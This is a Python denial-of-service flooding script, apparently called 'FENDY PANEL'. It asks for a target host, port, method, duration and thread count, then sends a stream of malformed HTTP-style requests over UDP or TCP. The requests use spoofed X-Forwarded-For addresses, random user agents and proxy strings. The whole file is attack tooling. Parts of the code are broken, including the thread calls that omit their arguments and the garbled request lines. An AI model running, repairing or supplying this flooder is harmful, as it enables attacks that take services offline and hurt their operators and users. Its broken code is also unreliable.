import random
import socket
import sys
import time
import threading

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

def menu():
        print ("\033[91mWELCOME TO FENDY PANEL")
ip = str(input("\033[91mHOST OR IP :"))
port = int(input("\033[91mPORT :"))
method = str(input("\033[91mMETHOD :"))
duration = int(input("\033[91mDURATION :"))
threads = int(input("Threads : "))

def ddos(ip, port, method, duration):
    try:
        start_time = time.time()
        
        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
        post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
        referer = "Referer: " + random.choice(https) + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n" + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        socks = "socks5: " + random.choice(socks5) + "\r\n"
        length = "Content-Length: 0\r\n"
        forward = "X-Forwarded-For: 1\r\n"
        forwards = "Client-IP: " + ip + "\r\n"
        accept = random.choice(useragents) + "\r\n"
        mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
        httpss = "User-Agent: " + random.choice(https) + "\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        request = get_host + post_host + get_data + httpss + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"

        if method == "UDP":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip, port))
            while time.time() - start_time < duration:
                s.sendall(request.encode())
                print("\033[91m[ + ] ATTACKING SERVER !!")

                

        if method == "TCP":
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, port))
            while time.time() - start_time < duration:
                s.sendall(request.encode())
                print("\033[91m[ + ] ATTACKING SERVER !!")

    except ConnectionResetError:
        pass

    except KeyboardInterrupt:
        sys.exit()

    except Exception as e:
        pass

if __name__ == "__main__":
    with open("ua.txt", "r") as ua_file:
        useragents = ua_file.readlines()

    with open("proxy.txt", "r") as proxy_file:
        socks5 = proxy_file.readlines()

    with open("https.txt", "r") as proxy_file:
        https = proxy_file.readlines()
    
for y in range(threads):
    th = threading.Thread(target = ddos)
    th.start()

    time.sleep(duration)
    print(f"Attacks End {duration}s")
